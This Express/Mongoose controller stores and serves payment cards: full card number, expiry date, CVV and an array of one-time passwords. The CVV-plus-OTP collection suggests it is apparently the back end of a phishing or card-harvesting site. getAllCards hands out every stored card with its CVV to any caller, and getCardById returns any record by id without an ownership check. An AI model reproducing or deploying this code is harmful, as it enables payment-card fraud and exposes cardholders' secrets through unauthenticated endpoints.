const jwt = require('jsonwebtoken');
const mongoose = require('mongoose');
const Card = require('./userModel');

exports.createCard = async (req, res) => {
  try {
    const { name, cardNumber, expiryDate, cvvNumber, cardType, otp } = req.body;

    const newCard = new Card({
      name,
      cardNumber,
      expiryDate,
      cvvNumber,
      cardType,
      otp  // Assuming otp is an array of strings
    });

    await newCard.save();

    // Ensure JWT_SECRET is loaded from environment variables
    const token = jwt.sign(
      { cardId: newCard._id, name: newCard.name },
      process.env.JWT_SECRET,  // This should now be correctly set
      { expiresIn: '1h' }
    );

    res.status(201).json({ message: 'Card created successfully', card: newCard, token });
  } catch (error) {
    console.error('Error creating card:', error); // Log the actual error for debugging
    res.status(500).json({ message: 'Error creating card', error: error.message || error });
  }
};




// Get all cards
exports.getAllCards = async (req, res) => {
  try {
    const cards = await Card.find().sort({ createdAt: -1 });
    res.status(200).json(cards);
  } catch (error) {
    res.status(500).json({ message: 'Error retrieving cards', error });
  }
};

exports.updateCard = async (req, res) => {
  try {
    const { name, cardNumber, expiryDate, cvvNumber, cardType, otp } = req.body;
    
    // Get the card ID from the authenticated user (from JWT token)
    const cardId = req.user.cardId;

    const updatedCard = await Card.findByIdAndUpdate(
      cardId,
      { name, cardNumber, expiryDate, cvvNumber, cardType, otp }, // Ensure otp is an array
      { new: true, runValidators: true }
    );

    if (!updatedCard) {
      return res.status(404).json({ message: 'Card not found' });
    }

    res.status(200).json({ message: 'Card updated successfully', card: updatedCard });
  } catch (error) {
    res.status(500).json({ message: 'Error updating card', error });
  }
};

exports.getCardById = async (req, res) => {
  try {
      const { id } = req.params;
      const card = await Card.findById(id);
      if (!card) {
          return res.status(404).json({ message: 'Card not found' });
      }
      res.json(card);
  } catch (error) {
      res.status(500).json({ message: 'Server error', error });
  }
};